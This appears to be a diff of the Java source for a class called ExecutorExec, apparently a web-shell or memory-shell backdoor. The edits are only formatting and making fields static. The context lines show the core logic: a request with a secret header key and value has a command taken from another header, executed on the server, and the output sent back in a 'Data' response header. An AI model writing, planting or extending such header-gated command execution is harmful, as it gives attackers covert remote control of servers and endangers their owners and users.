@@ -22,8 +22,8 @@ public class ExecutorExec implements InvocationHandler {
     private static String HEADER;
     private Object targetObject;
     private String responseHeader = "Data";
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ExecutorExec() {
     }
@@ -47,7 +47,7 @@ public class ExecutorExec implements InvocationHandler {
         try {
             String header = getHeader();
             Map<String, String> headers = getHeaders(header);
-            if (headers.get(lockHeaderKey)!= null && headers.get(lockHeaderKey).contains(lockHeaderValue)) {
+            if (headers.get(lockHeaderKey) != null && headers.get(lockHeaderKey).contains(lockHeaderValue)) {
                 String value = headers.get(HEADER);
                 String result = exec(value);
                 getResponse(result);
@@ -332,7 +332,7 @@ public class ExecutorExec implements InvocationHandler {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
